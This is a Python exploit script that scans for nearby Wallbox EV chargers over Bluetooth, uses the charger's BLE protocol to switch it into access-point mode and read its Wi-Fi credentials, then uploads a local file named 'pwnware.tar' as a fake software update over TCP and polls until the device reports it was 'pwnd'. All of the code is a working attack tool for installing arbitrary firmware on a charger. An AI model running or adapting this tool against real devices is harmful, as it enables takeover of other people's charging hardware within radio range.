import asyncio
import contextlib
import hashlib
import json
import random
import socket
import sys

from bleak import BleakClient, BleakScanner
from bleak.backends.characteristic import BleakGATTCharacteristic

class BluetoothDevice():
    def __init__(self, name, pair, service, rx, tx, chunk_size, write_response):
        self.name = name
        self.pair = pair
        self.service = service
        self.rx = rx
        self.tx = tx
        self.chunk_size = chunk_size
        self.write_response = write_response

device_types = [
    BluetoothDevice("BGX", True, "331a36f5-2459-45ea-9d95-6142f0c4b307", "a9da6040-0823-4995-94ec-9ce41ca28833", "a73e9a10-628f-4494-a099-12efaf72258f", 256, True),
    BluetoothDevice("Zentri", False, "175f8f23-a570-49bd-9627-815a6a27de2a", "1cce1ea8-bd34-4813-a00a-c76e028fadcb", "cacc07ff-ffff-4c48-8fae-a9ef71b75e26", 20, False),
    BluetoothDevice("UBlox", False, "2456e1b9-26e2-8f83-e744-f34f01e9d701", "2456e1b9-26e2-8f83-e744-f34f01e9d703", "2456e1b9-26e2-8f83-e744-f34f01e9d703", 20, False),
]

class WallboxBLE():
    def __init__(self):
        self.all_data = bytearray()
        self.evt = asyncio.Event()
        self.response = {}

    async def connect(self, device):
        self.client = BleakClient(device, timeout=30)
        await self.client.connect()

        self.device_definition = None
        for dt in device_types:
            if self.client.services.get_service(dt.service):
                print("Identified Bluetooth chip:", dt.name)
                self.device_definition = dt
                break

        # Pairing is not implemented on mac
        with contextlib.suppress(NotImplementedError):
            if self.device_definition.pair:
                await self.client.pair()

        await self.client.start_notify(self.device_definition.tx, self.handle_rx)
        nus = self.client.services.get_service(self.device_definition.service)
        self.rx_char = nus.get_characteristic(self.device_definition.rx)

    async def handle_rx(self, _: BleakGATTCharacteristic, data: bytearray):
        self.all_data += data
        try:
            parsed_data = json.loads(self.all_data)
            if parsed_data["id"] == self.request_id:
                self.response = parsed_data.get("r")
                self.evt.set()
        except:
            pass

    async def execute(self, method, parameter=None):
        self.request_id = random.randint(1, 999)
        self.all_data = bytearray()
        self.response = {}

        payload = { "met": method, "par": parameter, "id": self.request_id }

        data = json.dumps(payload, separators=[",", ":"])
        data = bytes(data, "utf8")
        data = b"EaE" + bytes([len(data)]) + data
        data = data + bytes([sum(c for c in data) % 256])

        chunks = [data[i:i+self.device_definition.chunk_size] for i in range(0, len(data), self.device_definition.chunk_size)]

        for chunk in chunks:
            await self.client.write_gatt_char(self.rx_char, chunk, self.device_definition.write_response)

        with contextlib.suppress(asyncio.TimeoutError):
            await asyncio.wait_for(self.evt.wait(), 10)
        self.evt.clear()
            
        return self.response

async def main():
    devices = await BleakScanner.discover()

    # Find device
    wallboxes = [d for d in devices if d.name is not None and d.name.startswith("WB")]
    if not wallboxes:
        print("No Wallbox found within Bluetooth range")
        sys.exit(1)
    print("Please choose Wallbox:")
    for i, wb in enumerate(wallboxes):
        print(f"{i}) {wb.name} ({wb.address})")
    chosen_idx = int(input("> "))

    # Connect Bluetooth and setup AP
    wb = WallboxBLE()
    await wb.connect(wallboxes[chosen_idx])

    print("Setting Wallbox to AP mode")
    wifi_creds = await wb.execute("s_hup")
    if "ssid" not in wifi_creds:
        print("Failed to set Wallbox to AP mode")
        return

    # Read payload and prepare Wallbox to receive
    payload = open("pwnware.tar", "rb").read()
    md5 = hashlib.md5(payload).hexdigest()

    await wb.execute("s_deb", {"deb":"software.tar.gz","md5":md5,"size":str(len(payload))})

    hup_data = await wb.execute("r_hup")
    if hup_data.get('st') != "recv":
        print("Wallbox not ready for pwnware, try again")

    print(f"Wallbox AP is ready, connect to {wifi_creds['ssid']} using password {wifi_creds.get('pass')}, then press return")
    input("> ")

    # Send payload over TCP
    print("Sending pwnware")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((wifi_creds.get("ip"), int(wifi_creds.get("port"))))
    s.sendall(payload)
    data = s.recv(1024)
    if data == b'FileReceived!':
        print("Pwnware was received by Wallbox")
    s.close()

    # Wait for Wallbox to process pwnware
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "proc":
            print("Wallbox is processing pwnware...")
            break
        await asyncio.sleep(2)
    while True:
        hup_data = await wb.execute("r_hup")
        if hup_data.get('st') == "done":
            print("Wallbox was pwnd successfully!")
            break
        await asyncio.sleep(2)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except asyncio.exceptions.CancelledError:
        pass
